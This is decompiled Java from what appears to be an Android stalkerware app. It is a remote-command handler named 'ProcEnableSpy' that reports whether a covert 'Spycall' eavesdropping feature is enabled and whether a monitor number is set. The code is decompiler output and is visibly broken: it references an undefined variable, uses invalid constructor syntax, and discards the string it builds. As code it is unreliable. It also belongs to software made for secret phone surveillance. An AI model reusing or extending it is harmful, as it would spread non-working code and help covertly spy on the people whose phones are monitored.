package com.vvt.remotecommand.processor.f;

import com.vvt.base.FeatureId;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.output.RmtCtrlOutputSettings;
import java.util.List;

public class b
  extends com.vvt.remotecommand.processor.a
{
  public b(com.vvt.remotecontrol.a parama)
  {
    super(parama, localRemoteFunction);
  }
  
  protected String a()
  {
    return "ProcEnableSpy";
  }
  
  protected String b()
  {
    Object localObject1 = com.vvt.remotecontrol.b.b(h());
    Object localObject2 = FeatureId.SPY_CALL;
    boolean bool = ((RmtCtrlOutputSettings)localObject1).getFeatureStatus((FeatureId)localObject2);
    Object localObject3 = FeatureId.MONITOR_NUMBER;
    localObject3 = ((RmtCtrlOutputSettings)localObject1).getCommonData((FeatureId)localObject3);
    String str = "Spycall is %s";
    int j = 1;
    Object[] arrayOfObject = new Object[j];
    if (bool) {}
    for (localObject1 = "enabled";; localObject1 = "disabled")
    {
      arrayOfObject[0] = localObject1;
      localObject1 = String.format(str, arrayOfObject);
      if (localObject3 != null)
      {
        int i = ((List)localObject3).size();
        if (i != 0) {}
      }
      else
      {
        localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
        localObject2 = "\nMonitor number is not set.";
        localObject1 = (String)localObject2;
      }
      return (String)localObject1;
    }
  }
  
  protected boolean c()
  {
    return true;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/f/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */